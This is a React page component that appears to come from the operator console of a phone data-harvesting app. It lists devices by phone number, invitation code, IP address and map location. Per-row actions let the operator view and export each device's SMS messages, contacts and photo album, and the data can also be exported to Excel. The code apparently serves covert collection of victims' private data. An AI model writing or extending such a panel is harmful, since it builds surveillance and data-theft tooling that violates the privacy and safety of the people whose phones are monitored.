import React, { Component } from 'react'
import { Input, Button, Table, notification, Popover, message, Popconfirm, Spin } from "antd"
import "./index.less"
import moment from "moment"
import { EditOutlined, CodepenOutlined, DeleteOutlined } from '@ant-design/icons';
import Map from '../../component/modal/device/map'
import Duanxin from '../../component/modal/device/duanxin'
import Tongxunlu from '../../component/modal/device/tongxunlu'
import Deleteinfo from '../../component/modal/device/deleteinfo'
import { observer, inject } from "mobx-react";
import Photo from '../../component/modal/device/photo';
const { Search } = Input
@inject("device")
@observer
class Device extends Component {
    constructor(props) {
        super(props)  
    }
    componentDidMount() {
       
        this.props.device.getshebeilist()
    }
     //显示地图弹通知提醒框
    openNotification = (text) => {
        // console.log(text)
        notification.open({
            message: '地图位置',
            placement: "topRight",
            duration: null,
            description: (<Map text={text}></Map>),
    
        });
    
    }
    render() {
        const { dataSource, wid,  loading,  addoutshebeitongxunlu, addoutshebeiduanxin, deletemodalshow,onSearch,downpic } = this.props.device
        const columns = [
            {
                title: '登录手机',
                dataIndex: 'phone',
                key: 'phone',
            },
            {
                title: '邀请码',
                dataIndex: 'Invitation',
                key: 'Invitation',
            },
            {
                title: '登录时间',
                dataIndex: 'time',
                key: 'time',
                render: (text) => (
                    <div>{moment(text * 1000).format("YYYY-MM-DD HH:mm:ss")}</div>
                )
            },
            {
                title: '地图位置',
                dataIndex: 'position',
                key: 'position',
                render: (text) => {
                    return <a onClick={() => { this.openNotification(text) }}>显示位置</a>
                }
            },
            {
                title: '手机型号',
                dataIndex: 'phonemodel',
                key: 'phonemodel',
            },
            {
                title: 'ip地址',
                dataIndex: 'ipcofig',
                key: 'ipcofig',
            },
            {
                title: '操作',
                dataIndex: 'deal',
                key: 'deal',
                render: (text, record) => {
                    // console.log(text)
                    // console.log(record)
                    return (
                        <div className="deal">
                            <a onClick={() => { this.props.device.showduanxinmodal(record.wid) }}> <EditOutlined />查看短信</a>
                            <a onClick={() => { this.props.device.showtongxunlumodal(record.wid) }}> <EditOutlined />查看通讯录</a>
                            <a onClick={() => { this.props.device.showphotomodal(record.wid) }}> <EditOutlined />查看相册</a>
                            <a onClick={() => { addoutshebeitongxunlu(record.wid, record.phone) }}> <CodepenOutlined />导出通讯录</a>
                            <a onClick={() => { addoutshebeiduanxin(record.wid, record.phone) }}> <CodepenOutlined />导出短信</a>
                            <a onClick={() => { downpic(record.wid, record.phone) }}> <CodepenOutlined />导出相册</a>
                            <a onClick={() => { deletemodalshow({ type: "deleteshebei", pid: record.pid }) }}> <DeleteOutlined />删除</a>

                        </div>
                    )
                }
            },
        ]
        return (
            <div className="device">
                <Search
                    size="middle"
                    style={{ width: 300 }}
                    onSearch={onSearch}
                    placeholder="请输入手机号或者邀请码"
                ></Search>
                <Button type="primary" onClick={() => { deletemodalshow({ type: "deleteallshebei" }) }}>
                    清空所有设备
                </Button>
                <Button type="primary" onClick={this.props.device.getexcel}>导出excel表</Button>
                <Spin spinning={loading}>
                    <Table
                        columns={columns}
                        dataSource={dataSource}
                        pagination={false}
                    >

                    </Table>
                </Spin>
                {wid && <Duanxin ></Duanxin>}
                {wid && <Tongxunlu ></Tongxunlu>}
                { wid && <Photo></Photo> }
                
                <Deleteinfo></Deleteinfo>


            </div>
        )
    }
}
export default Device